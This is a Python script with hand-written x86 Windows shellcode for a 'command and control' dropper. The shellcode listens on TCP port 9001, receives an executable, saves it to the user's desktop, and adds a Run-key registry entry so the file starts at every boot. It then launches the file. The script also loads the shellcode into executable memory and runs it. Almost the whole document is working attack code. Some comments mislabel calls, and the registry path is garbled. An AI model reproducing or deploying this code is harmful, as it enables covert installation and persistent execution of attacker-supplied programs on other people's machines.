#!/usr/bin/python
#
# Shellcode for CCI (Command & Control Interface) receive, install and execute:
# This shellcode listens on port TCP 9001 for the data of cci.exe
# Then saves cci.exe in C:\Users\admin\Desktop\cci.exe
# Then adds a value into the HKEY_CURRENT_USER Run key to start cci.exe upon machine boot
#
# The starting point for this shellcode has been the reverse TCP shellcode from here:
# https://github.com/Y3A/short-reverse-shellcode/blob/main/custom_shellcode.py
#
# Warning: this shellcode calls VirtualAlloc to make the receive buffer executable.
# This is not necessary and can be omitted. It has been included to easily support future extensions.

import ctypes, struct
from ctypes import wintypes

from keystone import *
CODE = (
'''
start:
    mov ebp, esp;
    sub sp, 0x610;

find_kernel32:
    xor ecx, ecx;                            
    mov esi, dword ptr fs:[ecx + 0x30];         # ESI = address of PEB
    mov esi, dword ptr[esi + 0xc];              # ESI = address of struct _PEB_LBR_DATA
    mov esi, dword ptr[esi + 0x1c];             # ESI = address of the first _LIST_ENTRY of InInitializationOrderModuleList

parse_next_module:
    mov ebx, dword ptr[esi + 0x8];              # EBX = InInitOrder[X].DllBase (Base Address of the module being examined)
    inc esi;                                    # Begin badchar 0x20 mitigation
    mov edi, dword ptr[esi + 0x1f];             # EDI = address of the module's name Unicode string
    dec esi;                                    # End badchar 0x20 mitigation
    mov esi, [esi];                             # ESI = InInitOrder[X].Flink (move to next module)
    cmp word ptr[edi + 12 * 2], cx;             # Is the 13-th Unicode char NULL? If yes, "KERNEL32.DLL" has been found
    jne parse_next_module;                      # If not, continue looping and examine the next module of the list

find_function_jmp:
    jmp callback;                               # Jump to callback to make a negative (null byte free) call to get_find_function_addr

get_find_function_addr:                         
    pop esi;                                    # The address of find_function is popped in ESI
    mov dword ptr[ebp + 0x4], esi;              # The address of find_function is stored at (EBP + 4)
    jmp resolve_k32_sym;                        # Once the address of find_function has been stored, proceed with the resolution of kernel32 symbols

callback:
    call get_find_function_addr;                # When this call is done, the address of the 1st instruction find_function (add esp, 0x4) is pushed to the stack
                                                # This is the address of find_function, and it will be popped in ESI (see get_find_function_addr).
                
find_function:         

# Current stack layout:
# Return Address (addr of instruction after "call find_function", see below)
# 12                        <- ESP
# Hash of CreateProcessA
# Hash of LoadLibraryA
# 0x00000000

    add esp, 0x4;                               # Point ESP to value 12
    pop eax;                                    # EAX = 12
    push 0xffffffff;                            # Write 0xffffffff on the stack instead of 12
    add esp, eax;                               # Add 12 to ESP

# Current stack layout:
# Return Address
# 0xffffffff
# Hash of CreateProcessA
# Hash of LoadLibraryA
# 0x00000000                <- ESP

find_function_loop2:
    mov eax, dword ptr[ebx + 0x3c];             # EAX = offset to the PE Header of the module
    mov edi, dword ptr[ebx + eax + 0x78];       # EDI = RVA of the Export Directory Table of the module (1st field: VirtualAddress)
    add edi, ebx;                               # EDI = VMA of the Export Directory Table of the module
    mov ecx, dword ptr[edi + 0x18];             # ECX = NumberOfNames (field of the Export Directory Table of the module)
    inc edi;                                    # Begin mitigation of badchar 0x20
    mov eax, dword ptr[edi + 0x1f];             # EAX = RVA of AddressOfNames (array of Name Addresses, field of the Export Directory Table)
    dec edi;                                    # End mitigation of badchar 0x20
    add eax, ebx;                               # EAX = VMA of AddressOfNames
    mov dword ptr[ebp - 0x4], eax;              # Save the VMA of AddressOfNames at (EBP - 4): this location is never touched for anything else

find_function_loop:
    dec ecx;                                    # Initially, ECX = NumberOfNames: decrement to get the index of the last name
    mov eax, dword ptr[ebp - 0x4];              # EAX = VMA of AddressOfNames
    mov esi, dword ptr[eax + ecx * 4];          # ESI = RVA of the current Symbol Name
    add esi, ebx;                               # ESI = VMA of the current Symbol Name

compute_hash:
    xor eax, eax;                               # EAX = 0
    cdq;                                        # If the MSB of EAX = 1: EDX = 0x11111111
                                                # If the MSB of EAX = 0: EDX = 0x00000000 -> fills EDX with the sign of EAX
                                                # In this case, EDX = 0x00000000 because EAX = 0x00000000

compute_hash_repeat:
    ror edx, 0xd;                               # Right-shift EDX of 13 bits
    add edx, eax;                               # EDX += current EAX value
    lodsb;                                      # Load the byte pointed by ESI into AL
    test al, al;                                # Test if the NULL terminator of the Symbol Name has been reached
    jnz compute_hash_repeat;                    # If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                                # Else, perform the next iteration of the hash-computation algorithm
                                                # At this point, EDX contains the computed hash of the current symbol

find_function_compare:                          
    cmp edx, dword ptr[esp - 4];                # Compare the computed hash with the hash of the wanted symbol
    jnz find_function_loop;                     # If ZF = 0, the hash is different: proceed with the next name from AddressOfNames
                                                # If ZF = 1, the hash is equal: symbol found: continue hereby
    mov edx, dword ptr[edi + 0x24];             # EDX = RVA of the AddressOfNameOrdinals array
    add edx, ebx;                               # EDX = VMA of the AddressOfNameOrdinals array
    mov cx, word ptr[edx + 2 * ecx];            # CX = Symbol's Ordinal (lower 16 bits of ECX)
    mov edx, dword ptr[edi + 0x1c];             # EDX = RVA of the AddressOfFunctions array
    add edx, ebx;                               # EDX = VMA of the AddressOfFunctions array
    mov eax, dword ptr[edx + 4 * ecx];          # EAX = AddressOfFunctions[ordinal] = RVA of the wanted symbol
    add eax, ebx;                               # EAX = VMA of the wanted symbol
    push eax;                                   # Push the wanted symbol's VMA onto the stack:
                                                # ATTENTION: The symbol's VMA overwrites its Hash on the stack!
    cmp dword ptr[esp - 4], 0xffffffff;         # If *(ESP - 4) is 0xffffffff: ZF = 1: all wanted symbols have been resolved
    jnz find_function_loop2;                    # Until all wanted symbols have been resolved, continue looping

find_function_finish:                           # When we get here, all wanted symbols have been resolved: their VMAs are on the stack
    sub esp, 0x8;                               # Point ESP to the Return Address of find_function
    ret;                                        # Return

resolve_k32_sym:
    push 0x7c0017a5;                            # Hash of CreateFileA
    push 0xe80a791f;                            # Hash of WriteFile
    push 0xffd97fb;                             # Hash of CloseHandle
    push 0xec0e4e8e;                            # Hash of LoadLibraryA
    push 0x16b3fe72;                            # Hash of CreateProcessA
    push 0x91afca54;                            # Hash of VirtualAlloc
    push 28;                                    # Push of 16 to the stack
    call dword ptr[ebp + 0x4];                  # Call to find_function (see find_function above)

load_ws2_32:
    xor eax, eax;                               # EAX = 0
    mov ax, 0x6c6c;                             # EAX = "<0x00><0x00>ll"
    push eax;                                   # Push "<0x00><0x00>ll"
    push 0x642e3233;                            # Push "d.23"
    push 0x5f327377;                            # Push "_2sw"
    push esp;                                   # Push address of "ws2_32.dll"
    call dword ptr[esp + 0x1c];                 # Call LoadLibraryA

resolve_ws2_sym:
    mov ebx, eax;                               # EBX = Base Address of ws2_32.dll
    push 0xe71819b6;                            # Hash of recv
    push 0x498649e5;                            # Hash of accept
    push 0xe92eada4;                            # Hash of listen
    push 0xc7701aa4;                            # Hash of bind
    push 0xadf509d9;                            # Hash of WSASocketA
    push 24;                                    # Push 24 (Total bytes of Hashes pushed + 4)
    call dword ptr[ebp + 0x4];                  # Call find_function

call_wsasocketa:
    xor eax, eax;
    push eax;                                   # Parameter dwFlags = 0
    push eax;                                   # Parameter g = 0 
    push eax;                                   # Parameter lpProtocolInfo = 0
    push 0x6;                                   # Parameter protocol = 6 (TCP)
    push 0x1;                                   # Parameter type = 1
    push 0x2;                                   # Parameter af = 2 (AF_INET)
    call dword ptr[esp + 0x1c];                 # Call WSASocketA

call_bind:                                   
# Preparation of the sockaddr_in structure on the stack:
    mov ebx, eax;                               # EBX = socket fd open with WSASocketA
    xor edi, edi;                               # EDI = 0
    xor eax, eax;                               # EAX = 0
    push edi;                                   # Field sin_zero[]: bytes 4-7
    push edi;                                   # Field sin_zero[]: bytes 0-3
    push 0xffffffff;                            # Field sin_addr
    inc dword ptr[esp];

# Fields sin_port + sin_family of sockaddr_in: they are two short values, I have to put them in a DWORD:
# ATTENTION: when the DWORD is loaded, it is read in little-endian. The two fields in the struct are, in the order:
# - sin_family
# - sin_port
# But in the DWORD they are swapped: DWORD = [sin_port (2 bytes) | sin_family (2 bytes)]    
    mov di, 0x2923;                             # DI = port 9001 = 0x2329
    shl edi, 0x10;                              # Shift the port in the upper 2 bytes of EDI
    add di, 0x2;                                # DI = 2 -> now EDI = [sin_port | sin_family]
    push edi;                                   # Fields sin_family, sin_port
    mov edi, esp;                               # EDI = address of the sockaddr_in struct
    push 0x10;                                  # Prameter namelen = 16
    push edi;                                   # Parameter *name = address of the sockaddr_in struct
    push ebx;                                   # Parameter s = socket
    call dword ptr[esp + 0x24];                 # Call connect
            
call_listen:
    xor edi, edi;
    inc edi;
    push edi;                                   # Parameter backlog = 1
    push ebx;                                   # Parameter s = socket
    call dword ptr[esp + 0x24];                 # Call listen

call_accept:
    dec edi;                                    
    push edi;                                   # Parameter addrlen = 0 (optional)
    push edi;                                   # Parameter *addr = 0 (optional)
    push ebx;                                   # Parameter s = socket
    call dword ptr[esp + 0x2c];                 # Call accept: EAX = incoming connection socket

call_virtualalloc:
    push eax;                                   # Save the incoming socket on the stack
    push esp;
    pop edi;
    add edi, 0xffffb1e0;                        # Reserve 20000 bytes space for receiving the EXE file
    push 0x40;                                  # Parameter flProtect = 0x40
    push 0x1000;                                # Parameter flAllocationType = 0x1000 = MEM_COMMIT
    mov eax, 0xffffb1e0;                        # Parameter dwSize = 20000
    neg eax;
    push eax;
    push edi;                                   # Parameter lpAddress
    call dword ptr[esp + 0x4c];                 # Call VirtualAlloc
    pop eax;                                    # Restore the incoming socket in EAX

call_recv:
    push 0xffffffff;                            # Parameter flags = 0
    inc dword ptr[esp];
    mov ecx, 0xfffffc00;
    neg ecx;                                    # ECX = 1024
    xor esi, esi;                               
    mov dword ptr [ebp + 0x80], esi;            # Received bytes counter stored at (EBP + 0x80)
    push ecx;                                   # Parameter len: try to read at max 1024 bytes
    push edi;                                   # Parameter buf
    push eax;                                   # Parameter s = incoming connection socket
loop_recv_data:    
    call dword ptr[esp + 0x34];                 # Call recv: EAX = received bytes
    sub esp, 0x10;                              # Re-align ESP to the parameters of recv:
                                                # Adjust buf and len for the next read (if there is still data to read)
    add dword ptr[esp + 4], eax;                # buf += bytes read
    add dword ptr[ebp + 0x80], eax              # Received bytes counter += bytes read
    xor esi, esi;                               # ESI = 0
    cmp eax, esi;                               # Compare the number of received bytes with 0
    ja loop_recv_data;                          # If received bytes > 0, try to recv again: maybe there is still data
                                                # But if received bytes <= 0, there is no more data available
recv_finished:
    mov esi, dword ptr[ebp + 0x80]              # Load the total number of received bytes in ESI
    mov eax, dword ptr[esp + 0x4]               # EAX = current buffer pointer (end of the recv buffer)
    sub eax, esi                                # EAX = start of the recv buffer
    mov dword ptr[ebp + 0x80], eax              # Address of received buffer stored at (EBP + 0x80)
    mov dword ptr[ebp + 0x84], esi              # Total number of bytes received stored at (EBP + 0x84)

call_createfilea:
    mov eax, 0xffff9a88                         # EAX = negated "xe<0x00><0x00>"
    neg eax
    push eax                                    # 'xe<0x00>' 
    push 0x652E6963					            # 'ci.e' (reversed)
    push 0x635C706F					            # 'op\\c' (reversed)
    push 0x746B7365					            # 'eskt' (reversed)
    push 0x445C6E69					            # 'in\\D' (reversed)
    push 0x6D64615C					            # '\\adm' (reversed)
    push 0x73726573					            # 'sers' (reversed)
    push 0x555C3A43					            # 'C:\\U' (reversed)
    push esp
    pop esi                                     # ESI = address of the .exe file path
    mov dword ptr[ebp + 0x7c], esi              # Save the address of the .exe file path at (EBP + 0x7c)
    xor eax, eax
    push eax                                    # Parameter hTemplateFile = 0
    push eax                                    # Parameter dwFlagsAndAttributes = 0 = FILE_ATTRIBUTE_NORMAL
    inc eax
    inc eax
    push eax                                    # Parameter dwCreationDisposition = 2 = CREATE_ALWAYS
    xor eax, eax
    push eax                                    # Parameter lpSecurityAttributes = 0
    push eax                                    # Parameter dwShareMode = 0
    mov eax, 0x3fffffff
    inc eax                                     # EAX = 0x40000000 = GENERIC_WRITE
    push eax                                    # Parameter dwDesiredAccess
    push esi                                    # Parameter lpFilename
    call dword ptr[esp + 152]                   # Call CreateFileA: EAX = file handle

call_writefile:
    # Address of EXE data buffer is stored at (EBP + 0x80)
    # Total size, in bytes, of EXE data is stored at (EBP + 0x80)
    xor ecx, ecx
    push ecx                                    # Parameter lpOverlapped = 0
    push ecx                                    # Parameter lpNumberOfBytesWritten = 0
    mov ecx, dword ptr[ebp + 0x84]              # ECX = Total size in bytes of EXE data
    push ecx                                    # Parameter nNumberOfBytesToWrite
    mov ecx, dword ptr[ebp + 0x80]              # ECX = address of EXE data buffer
    push ecx                                    # Parameter lpBuffer = EXE data
    push eax                                    # Parameter hFile = EXE file handle
    mov dword ptr[ebp + 0x88], eax              # Save EXE file handle at (EBP + 0x88)
    call dword ptr[esp + 140]                   # Call WriteFile

call_closehandle:
    mov eax, dword ptr[ebp + 0x88]              # EAX = EXE file handle
    push eax                                    # Parameter hObject = EXE file handle
    call dword ptr[esp + 120]

load_advapi32:
    xor eax, eax;                               # EAX = 0
    push eax                                    # NULL (string termination)
    push 0x6C6C642E                             # '.dll' (reversed)
    push 0x32336970                             # 'pi32' (reversed)
    push 0x61766461                             # 'adva' (reversed)
    push esp;                                   # Push address of "advapi32.dll"
    call dword ptr[esp + 132];                 # Call LoadLibraryA

resolve_advapi32_sym:
    mov ebx, eax;                               # EBX = Base Address of advapi32.dll
    push 0xa84aeb81;                            # Hash of RegOpenKeyExA
    push 0x2d1c9add;                            # Hash of RegSetValueExA
    push 12;                                    # Push 12 (Total bytes of Hashes pushed + 4)
    call dword ptr[ebp + 0x4];                  # Call find_function

call_regopenkeyexa:
    mov eax, 0x6EFFFFFF							
    shr eax, 24									# 'n\<NULL NULL NULL>' (reversed)
    push eax
    push 0x75525C6E 							# 'n\\Ru' (reversed)
    push 0x6F697372 							# 'rsio' (reversed)
    push 0x6556746E 							# 'ntVe' (reversed)
    push 0x65727275 							# 'urre' (reversed)
    push 0x435C7377 							# 'ws\\C' (reversed)
    push 0x6F646E69 							# 'indo' (reversed)
    push 0x575C7466 							# 'ft\\W' (reversed)
    push 0x6F736F72 							# 'roso' (reversed)
    push 0x63694D5C 							# '\\Mic' (reversed)
    push 0x65726177 							# 'ware' (reversed)
    push 0x74666F53 							# 'Soft' (reversed)
    mov esi, esp                                # ESI = address of string "Software\\Microsoft\\CurrentVersion\\Run"
    xor eax, eax
    push eax                                    # Location for output HKEY (4 bytes, phkResult)
    mov ecx, esp                                # ECX = address of output HKEY phkResult
    push ecx                                    # Parameter phkResult = address of output HKEY
    mov dword ptr[ebp + 0x88], ecx              # Save the address of the open HKEY at (EBP + 0x88), used later
    inc eax
    inc eax
    push eax                                    # Parameter samDesired = 2 = KEY_SET_VALUE
    xor eax, eax
    push eax                                    # Parameter ulOptions = 0
    push esi                                    # Parameter lpSubKey = address of string "Software\\Microsoft\\CurrentVersion\\Run"
    mov eax, 0x7fffffff
    neg eax                                     # EAX = 0x80000001
    push eax                                    # Parameter hKey = HKEY_CURRENT_USER = 0x80000001
    call dword ptr[esp + 80]                    # Call RegOpenKeyExA: ECX = address of hKey

call_regsetvalueexa:
    mov ecx, 0xff696363                         # ECX = reversed "cci<0xff>"
    shl ecx, 8;
    shr ecx, 8;                                 # ECX = reversed "cci<NULL>"
    push ecx
    mov esi, esp                                # ESI = address of string "cci"
    mov ecx, dword ptr[ebp + 0x7c]              # ECX = address of .exe file path
    mov eax, 0xffffffe1                         # EAX = -31
    neg eax                                     # EAX = 31
    push eax                                    # Parameter cbData = value length + 1 = 30 + 1
    push ecx                                    # Parameter lpData = address of EXE path
    xor eax, eax
    inc eax
    push eax                                    # Parameter dwType = REG_SZ = 1
    dec eax
    push eax                                    # Parameter Reserved = 0
    push esi                                    # Parameter lpValueName = "cci"
    mov ecx, dword ptr[ebp + 0x88]              # ECX = address of handle to the open HKEY
    mov ecx, dword ptr[ecx]                     # ECX = handle to the open HKEY
    push ecx                                    # Parameter hKey = handle to the open HKEY 
    call dword ptr[esp + 84]                    # Call RegSetValueExA

create_startupinfoa:
   xor ecx, ecx;
   mov cl, 60;                                  # STOSD counter = 60 DWORDs: prepare 60 zero-DWORDs on the stack, also used below
                                                # This allows to "sub esp, 4" instead of pushing 0x00000000 in the following code
                                                # The 0x00000000 will be already there, because it is stored by the following STOSD
   xor eax, eax;                                # EAX = 0
   lea edi, [esp - 60 * 4];                     # Destination = ESP - 60*4: STOSD starts writing the 60 DWORDs at the address in EDI
   rep stosd;                                   # Store 60 0x00000000 DWORDs (EAX) starting from the address in EDI
   sub esp, 16 * 4;                             # Update ESP to reflect the 16 stored DWORDs
   mov   al, 0x44;                              # AL = 0x44 = size of this struct 
   push  eax;                                   # Field cb = 0x44
   push  esp;
   pop   edi;                                   # EDI = address of the STARTUPINFOA struct

call_createprocessa:
    push esp;
    pop eax;                                    # EAX = current ESP value
    add eax, 0xfffffc70;                        # EAX = ESP - 912 bytes
    mov esi, eax;                               # Save ESI = address of _PROCESS_INFORMATION for WaitForSingleObject
    push eax;                                   # Parameter lpProcessInformation (output ptr to struct)
    push edi;                                   # Parameter lpStartupInfo
    sub esp, 4*6                                # The following 6 parameters have been already set to zero by the previous STOSD:
                                                # lpCurrentDirectory = 0
                                                # lpEnvironment = 0
                                                # dwCreationFlags = 0
                                                # bInheritHandles = 0
                                                # lpThreadAttributes = 0
                                                # lpProcessAttributes = 0
    mov ebx, dword ptr[ebp + 0x7c]              # EBX = address of exe file path                                                
    push ebx;                                   # Address of the cmd string
    sub esp, 4                                  # Parameter lpApplicationName = 0 already set to zero by the previous STOSD
    call dword ptr[esp + 300];                  # call CreateProcessA
'''
)
# Initialize engine in 32-bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding: 
 instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
 
print("Opcodes = (\"" + instructions + "\")")
print(f"Size: {len(encoding)} bytes.")

####################################### Execution #######################################

# Preparation of WSAStartup (not included in the shellcode)
# Define necessary structures and constants
class WSADATA(ctypes.Structure):
    _fields_ = [
        ("wVersion", wintypes.WORD),
        ("wHighVersion", wintypes.WORD),
        ("szDescription", wintypes.CHAR * 257),
        ("szSystemStatus", wintypes.CHAR * 129),
        ("iMaxSockets", wintypes.UINT),
        ("iMaxUdpDg", wintypes.UINT),
        ("lpVendorInfo", ctypes.POINTER(ctypes.c_char))
    ]

# Load the Winsock library
ws2_32 = ctypes.windll.ws2_32

# Define the WSAStartup function prototype
# WSAStartup takes two arguments:
# 1. A WORD containing the version of Winsock requested (e.g., 0x0202 for Winsock 2.2)
# 2. A pointer to a WSADATA structure that receives the details of the Winsock implementation
ws2_32.WSAStartup.argtypes = [wintypes.WORD, ctypes.POINTER(WSADATA)]
ws2_32.WSAStartup.restype = wintypes.INT

def call_wsastartup():
    # Request version 2.2 (0x0202)
    version_requested = 0x0202

    # Create an instance of WSADATA to hold the output
    wsadata = WSADATA()

    # Call WSAStartup
    result = ws2_32.WSAStartup(version_requested, ctypes.byref(wsadata))
    
    if result != 0:
        raise RuntimeError(f"WSAStartup failed with error code {result}")

    print(f"WSAStartup succeeded. Winsock version: {wsadata.wVersion >> 8}.{wsadata.wVersion & 0xFF}")
    return wsadata

call_wsastartup()

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

# Alloco memoria eseguibile per lo shellcode
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# Metto lo shellcode nel buffer `buf`
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

# Copio lo shellcode nella memoria allocata
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode: Short Reverse Shell")
print("Shellcode address = %s" % hex(ptr))
#input("\n[?] Press Enter to execute the shellcode.\n")

# Eseguo lo shellcode in un nuovo thread, su cui faccio la join
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))